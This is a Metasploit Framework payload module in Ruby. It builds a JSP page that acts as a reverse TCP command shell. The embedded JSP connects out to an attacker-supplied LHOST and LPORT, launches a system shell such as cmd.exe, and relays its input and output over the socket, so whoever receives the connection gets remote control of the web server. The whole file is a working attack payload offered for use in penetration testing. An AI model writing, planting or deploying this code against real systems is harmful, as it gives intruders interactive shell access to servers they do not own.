##
# This file in part of the Metasploit Framework and may be subject to
# redintribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Java JSP Command Shell, Reverse TCP Inline',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => [ 'sf' ],
			'License'       => MSF_LICENSE,
			'Platform'      => [ 'win', 'osx', 'linux', 'unix', 'solaris' ],
			'Arch'          => ARCH_JAVA,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
		register_options( [ OptString.new( 'SHELL', [ true, "The system shell to use.", 'cmd.exe' ]), ], self.class )
	end


	def generate
		# JSP Reverse Shell modified from: http://www.security.org.sg/code/jspreverse.html
		jsp = %q{
			<%@page import="java.lang.*"%>
			<%@page import="java.util.*"%>
			<%@page import="java.io.*"%>
			<%@page import="java.net.*"%>

			<%
				class StreamConnector extends Thread
				{
					InputStream is;
					OutputStream os;

					StreamConnector( InputStream is, OutputStream os )
					{
						this.is = is;
						this.os = os;
					}

					public void run()
					{
						BufferedReader in  = null;
						BufferedWriter out = null;
						try
						{
							in  = new BufferedReader( new InputStreamReader( this.is ) );
							out = new BufferedWriter( new OutputStreamWriter( this.os ) );
							char buffer[] = new char[8192];
							int length;
							while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
							{
								out.write( buffer, 0, length );
								out.flush();
							}
						} catch( Exception e ){}
						try
						{
							if( in != null )
								in.close();
							if( out != null )
								out.close();
						} catch( Exception e ){}
					}
				}

				try
				{
					Socket socket = new Socket( "LHOST", LPORT );
					Process process = Runtime.getRuntime().exec( "SHELL" );
					( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
					( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
				} catch( Exception e ) {}
			%>
		}

		if( !datastore['LHOST'] or datastore['LHOST'].empty? )
			return super
		end

		jsp = jsp.gsub( "LHOST", datastore['LHOST'] )

		jsp = jsp.gsub( "LPORT", datastore['LPORT'].to_s )

		jsp = jsp.gsub( "SHELL", datastore['SHELL'] )

		return super + jsp
	end

end
